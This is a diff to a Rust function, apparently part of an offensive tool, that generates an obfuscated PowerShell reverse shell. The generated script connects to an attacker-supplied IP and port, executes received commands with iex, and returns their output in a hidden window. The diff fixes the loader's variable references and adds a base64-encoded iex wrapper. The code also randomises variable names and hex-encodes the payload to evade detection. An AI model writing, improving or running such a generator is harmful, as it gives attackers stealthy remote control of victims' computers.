@@ -26,7 +26,7 @@ fn string_para_hex(s: &str) -> String {
 }
 
 pub fn gen_tcp(ip:&str, port:&str){
-    let header = generate(60);
+    // let header = generate(5);
     let tamanho: usize = 20;
 
     let ip_filtro = Regex::new(r"IP").unwrap();
@@ -37,7 +37,7 @@ pub fn gen_tcp(ip:&str, port:&str){
     let data_filtro = Regex::new(r"data").unwrap();
     let sendback_filtro = Regex::new(r"sendback").unwrap();
     let sendback2_filtro = Regex::new(r"sendback2").unwrap();
-    let header_filtro = Regex::new(r"RANDOM_HEADER").unwrap();
+    // let header_filtro = Regex::new(r"RANDOM_HEADER").unwrap();
     let payload_filtro = Regex::new(r"payload").unwrap();
     let loader_filtro = Regex::new(r"loader").unwrap();
     let execute_filtro = Regex::new(r"eifel").unwrap();
@@ -49,15 +49,15 @@ pub fn gen_tcp(ip:&str, port:&str){
     let bytes = r"[byte[]]$bytes = 0..65535|%{0};";
     let whilestr = r"while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;";
     let data = r"$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);";
-    let header_payload = r"$header = ('RANDOM_HEADER');";
+    // let header_payload = r"$header = ('RANDOM_HEADER');";
     let sendback = r"$sendback = (iex $data 2>&1 | Out-String );";
-    let sendback2 = r"$sendback2 = $header + $sendback + 'PS ' + (pwd).Path + '> ';";
+    let sendback2 = r"$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';";
     let sendbyte = r"$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);";
     let write = r"$stream.Write($sendbyte,0,$sendbyte.Length);";
     let flush = r"$stream.Flush()};$client.Close()} -WindowStyle Hidden";
     
    
-    let script_final = script_base + &client + &stream + bytes + whilestr +data +header_payload+sendback+sendback2+sendbyte+write+ flush;
+    let script_final = script_base + &client + &stream + bytes + whilestr +data+sendback+sendback2+sendbyte+write+ flush;
 
     
     let teste = stream_filtro.replace_all(&script_final, generate(tamanho));
@@ -68,11 +68,11 @@ pub fn gen_tcp(ip:&str, port:&str){
     let teste = sendback2_filtro.replace_all(&teste,generate(tamanho));
     let teste = ip_filtro.replace_all(&teste, ip);
     let teste = port_filtro.replace_all( &teste,port);
-    let teste = header_filtro.replace_all(&teste, encode64(header));
+    // let teste = header_filtro.replace_all(&teste, encode64(header));
 
     let injector = r"$payload='".to_string();
-    let injector2 = r" $loader = $teste -split '(..)' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16)};";
-    let injector3 = r"$eifel=[System.Text.Encoding]::UTF8.GetString($final); $runspace=[RunspaceFactory]::CreateRunspace(); $runspace.Open(); $ps = [PowerShell]::Create().AddScript($tenebres);$ps.Runspace = $runspace;$ps.Invoke();$runspace.Close() ";
+    let injector2 = r"$loader = $payload -split '(..)' | Where-Object { $_ } | ForEach-Object { [Convert]::ToByte($_, 16)};";
+    let injector3 = r"$eifel=[System.Text.Encoding]::UTF8.GetString($loader); $runspace=[RunspaceFactory]::CreateRunspace(); $runspace.Open(); $ps = [PowerShell]::Create().AddScript($eifel);$ps.Runspace = $runspace;$ps.Invoke();$runspace.Close()";
 
     let teste = injector +&string_para_hex(&teste)+ "';" + injector2 + injector3;
     
@@ -80,9 +80,11 @@ pub fn gen_tcp(ip:&str, port:&str){
     let teste = loader_filtro.replace_all(&teste, generate(tamanho));
     let teste = execute_filtro.replace_all(&teste,generate(tamanho));
    
+
+   let teste = encode64(teste.to_string());
     
-
-
+    let teste = r"iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('".to_string()+&teste +"')))";
+    
     println!("{}",teste);
 
 
